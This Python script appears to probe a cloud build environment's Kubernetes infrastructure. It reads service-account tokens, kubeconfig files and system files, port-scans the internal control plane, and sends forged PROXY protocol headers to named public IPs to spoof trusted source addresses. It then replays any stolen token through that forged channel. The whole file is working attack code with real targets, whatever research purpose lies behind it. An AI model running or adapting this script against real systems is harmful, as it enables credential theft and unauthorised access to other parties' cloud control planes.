import json, os, socket, ssl, struct, time, subprocess

r = {}

# ============================================================
# 1. DISCOVER BUILD CLUSTER CP
# ============================================================

# Check if we can find the build cluster's control plane IP
r['discovery'] = {}

# 1a. DNS for kubernetes API
try:
    ips = socket.getaddrinfo('kubernetes.default.svc.cluster.local', 443, socket.AF_INET)
    r['discovery']['k8s_api_ip'] = ips[0][4][0]
except Exception as e:
    r['discovery']['k8s_api_ip'] = str(e)[:60]

# 1b. Check resolv.conf for cluster domain
try:
    r['discovery']['resolv'] = open('/etc/resolv.conf').read()
except:
    pass

# 1c. Check env vars for any CP references
for k, v in os.environ.items():
    kl = k.lower()
    if any(x in kl for x in ['kubernetes', 'kube', 'cluster', 'apiserver', 'master', 'cp_', 'control_plane']):
        r['discovery'][f'env_{k}'] = v[:200]

# 1d. Try to get CP info via well-known kube-system configmaps
# (requires API access which is blocked, but let's try DNS SRV)
try:
    # SRV record for kubernetes API
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(3)
    # DNS SRV query for _https._tcp.kubernetes.default.svc.cluster.local
    query = (
        b'\x12\x36'  # Transaction ID
        b'\x01\x00'  # Standard query
        b'\x00\x01'  # 1 question
        b'\x00\x00\x00\x00\x00\x00'  # 0 answers, 0 authority, 0 additional
        b'\x06_https\x04_tcp\x0akubernetes\x07default\x03svc\x07cluster\x05local\x00'
        b'\x00\x21'  # SRV
        b'\x00\x01'  # IN class
    )
    s.sendto(query, ('10.245.0.10', 53))
    data, _ = s.recvfrom(4096)
    r['discovery']['srv_k8s'] = data.hex()[:200]
    s.close()
except Exception as e:
    r['discovery']['srv_k8s'] = str(e)[:60]

# 1e. Try to get server cert from the build cluster's API (via internal IP)
try:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    ss = ctx.wrap_socket(s, server_hostname='kubernetes')
    ss.connect(('10.245.0.1', 443))
    cert = ss.getpeercert(binary_form=True)
    r['discovery']['api_cert_len'] = len(cert)
    # Parse cert for SANs
    import ssl as ssl_mod
    cert_dict = ss.getpeercert()
    r['discovery']['api_cert_sans'] = cert_dict.get('subjectAltName', [])
    r['discovery']['api_cert_subject'] = cert_dict.get('subject', '')
    ss.close()
except Exception as e:
    r['discovery']['api_cert'] = str(e)[:100]

# ============================================================
# 2. PROXY PROTOCOL TO OUR DOKS CLUSTERS FROM BUILD
# ============================================================
r['proxy_proto'] = {}

# Our DOKS cluster CPs
targets = [
    {
        'name': 'cluster_a',
        'host': '24.199.65.106',
        'port': 8999,
        'cpbridge': '100.65.67.229',
        'uuid': 'ac2974a3-c1e3-48c2-9616-0002972c7d86',
    },
    {
        'name': 'cluster_b',
        'host': '45.55.116.41',
        'port': 8999,
        'cpbridge': '100.65.74.2',
        'uuid': '13079803-6ec3-4b23-8c3b-c3679565869e',
    },
]

for target in targets:
    name = target['name']
    r['proxy_proto'][name] = {}

    # 2a. Test: forge source IP as the cpbridge IP
    # The PROXY header tells the API server our source IP is the cpbridge
    proxy_header = f"PROXY TCP4 {target['cpbridge']} {target['cpbridge']} 12345 16443\r\n"

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((target['host'], target['port']))
        s.send(proxy_header.encode())

        # Wrap in TLS and try to get server cert / version
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ss = ctx.wrap_socket(s, server_hostname='kubernetes')

        cert = ss.getpeercert()
        r['proxy_proto'][name]['cert_sans'] = cert.get('subjectAltName', [])[:10]

        # Try unauthenticated API call - does forged cpbridge IP give us any privileges?
        ss.send(b'GET /version HTTP/1.1\r\nHost: kubernetes\r\nAccept: */*\r\n\r\n')
        resp = ss.recv(4096).decode(errors='replace')
        r['proxy_proto'][name]['version_resp'] = resp[:500]
        ss.close()
    except Exception as e:
        r['proxy_proto'][name]['cpbridge_forge'] = str(e)[:100]

    # 2b. Test: forge source IP as 127.0.0.1 (localhost)
    # API server might have special trust for localhost connections
    proxy_header_lo = f"PROXY TCP4 127.0.0.1 {target['cpbridge']} 12345 16443\r\n"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((target['host'], target['port']))
        s.send(proxy_header_lo.encode())

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ss = ctx.wrap_socket(s, server_hostname='kubernetes')

        # Try accessing API - anonymous auth might be different for localhost
        ss.send(b'GET /api HTTP/1.1\r\nHost: kubernetes\r\nAccept: */*\r\n\r\n')
        resp = ss.recv(4096).decode(errors='replace')
        r['proxy_proto'][name]['localhost_forge'] = resp[:500]
        ss.close()
    except Exception as e:
        r['proxy_proto'][name]['localhost_forge'] = str(e)[:100]

    # 2c. Test: forge source IP as 10.0.0.1 (could be internal/trusted)
    proxy_header_int = f"PROXY TCP4 10.0.0.1 {target['cpbridge']} 12345 16443\r\n"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((target['host'], target['port']))
        s.send(proxy_header_int.encode())

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ss = ctx.wrap_socket(s, server_hostname='kubernetes')

        # Try /api with this forged source
        ss.send(b'GET /api HTTP/1.1\r\nHost: kubernetes\r\nAccept: */*\r\n\r\n')
        resp = ss.recv(4096).decode(errors='replace')
        r['proxy_proto'][name]['internal_forge'] = resp[:500]
        ss.close()
    except Exception as e:
        r['proxy_proto'][name]['internal_forge'] = str(e)[:100]

# ============================================================
# 3. CHECK IF BUILD CLUSTER HAS PORT 8999 EXPOSED
# ============================================================
r['build_cluster_8999'] = {}

# We don't know the build cluster's public IP, but we can try
# to discover it via DNS, headers, or by scanning

# 3a. Try to find the build cluster CP via reverse DNS of the internal IP
try:
    hostname = socket.gethostbyaddr('10.245.0.1')
    r['build_cluster_8999']['reverse_dns'] = str(hostname)
except Exception as e:
    r['build_cluster_8999']['reverse_dns'] = str(e)[:60]

# 3b. Check if we can reach 10.245.0.1 on port 8999 (maybe not blocked?)
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    ret = s.connect_ex(('10.245.0.1', 8999))
    r['build_cluster_8999']['internal_8999'] = 'CONNECTED' if ret == 0 else f'errno={ret}'
    s.close()
except Exception as e:
    r['build_cluster_8999']['internal_8999'] = str(e)[:60]

# 3c. Check port 8132 (konnectivity)
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    ret = s.connect_ex(('10.245.0.1', 8132))
    r['build_cluster_8999']['internal_8132'] = 'CONNECTED' if ret == 0 else f'errno={ret}'
    s.close()
except Exception as e:
    r['build_cluster_8999']['internal_8132'] = str(e)[:60]

# ============================================================
# 4. SERVICE ACCOUNT TOKEN CHECK IN BUILD
# ============================================================
r['sa_token'] = {}

# Check for mounted service account token
sa_paths = [
    '/var/run/secrets/kubernetes.io/serviceaccount/token',
    '/run/secrets/kubernetes.io/serviceaccount/token',
    '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt',
    '/var/run/secrets/kubernetes.io/serviceaccount/namespace',
    '/secrets/kubernetes.io/serviceaccount/token',
]
for p in sa_paths:
    try:
        content = open(p).read()
        r['sa_token'][p] = content[:500]
    except Exception as e:
        r['sa_token'][p] = str(e)[:60]

# Also check if there's a kubeconfig anywhere
kube_paths = [
    '/root/.kube/config',
    '/home/apps/.kube/config',
    '/.kube/config',
    '/etc/kubernetes/admin.conf',
    '/etc/kubernetes/kubelet.conf',
]
for p in kube_paths:
    try:
        content = open(p).read()
        r['sa_token'][p] = content[:500]
    except Exception as e:
        r['sa_token'][p] = str(e)[:60]

# ============================================================
# 5. PROXY PROTOCOL TO BUILD CLUSTER VIA CPBRIDGE BYPASS
# ============================================================
# If we can find the build cluster's cpbridge IP, we could try
# to PROXY protocol to the build cluster's API with forged source

# Check cgroup for pod/container IDs that might help identify the cluster
try:
    r['build_id'] = {}
    cgroup = open('/proc/self/cgroup').read()
    r['build_id']['cgroup'] = cgroup[:300]

    # Extract pod UUID from cgroup
    import re
    pod_match = re.search(r'pod([a-f0-9-]+)', cgroup)
    if pod_match:
        r['build_id']['pod_uuid'] = pod_match.group(1)
except:
    pass

# Check hostname
r['build_id']['hostname'] = socket.gethostname()

# Check /etc/hosts for cluster info
try:
    r['build_id']['hosts'] = open('/etc/hosts').read()
except:
    pass

# ============================================================
# 6. PROXY PROTOCOL + SA TOKEN COMBO
# ============================================================
# If we find an SA token, try using it via PROXY protocol to access
# the build cluster's API (even though direct access is blocked)

# First check if there's any token at all
token = None
for p in sa_paths:
    try:
        token = open(p).read().strip()
        r['sa_token']['found_at'] = p
        break
    except:
        pass

if token:
    r['proxy_with_token'] = {}
    # Try to use token via PROXY protocol to our DOKS clusters
    # (won't work cross-cluster, but tests the mechanism)
    for target in targets:
        proxy_header = f"PROXY TCP4 {target['cpbridge']} {target['cpbridge']} 12345 16443\r\n"
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target['host'], target['port']))
            s.send(proxy_header.encode())

            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ss = ctx.wrap_socket(s, server_hostname='kubernetes')

            req = f'GET /api/v1/namespaces HTTP/1.1\r\nHost: kubernetes\r\nAuthorization: Bearer {token}\r\nAccept: application/json\r\n\r\n'
            ss.send(req.encode())
            resp = ss.recv(4096).decode(errors='replace')
            r['proxy_with_token'][target['name']] = resp[:500]
            ss.close()
        except Exception as e:
            r['proxy_with_token'][target['name']] = str(e)[:100]

print(json.dumps(r, indent=2, default=str))
